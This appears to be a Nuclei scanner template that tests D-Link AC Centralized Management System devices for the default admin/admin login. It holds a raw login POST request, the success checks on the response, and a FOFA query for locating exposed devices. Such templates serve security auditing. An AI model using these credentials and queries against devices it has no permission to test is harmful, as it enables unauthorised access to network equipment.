id: dlink-ac-centralized-management-system-default-login

info:
  name: D-Link AC Centralized Management System - Default Login
  author: SleepingBag945
  severity: high
  description: |
    D-Link AC Centralized Management System default login credentials were discovered.
  metadata:
    max-request: 1
    verified: true
    fofa-query: title="AC集中管理平台" && body="D-Link路由器管理页"
  tags: default-login,dlink

http:
  - raw:
      - |
        POST /login.cgi  HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        user={{username}}&password={{password}}

    attack: pitchfork
    payloads:
      username:
        - admin
      password:
        - admin

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'status_code_1 == 200 && !contains(body_1,"flag=0")'
        condition: and

      - type: word
        part: header
        words:
          - "Set-Cookie"
          - "ac_userid"
        condition: and

      - type: word
        part: body
        words:
          - "window.open"
        condition: and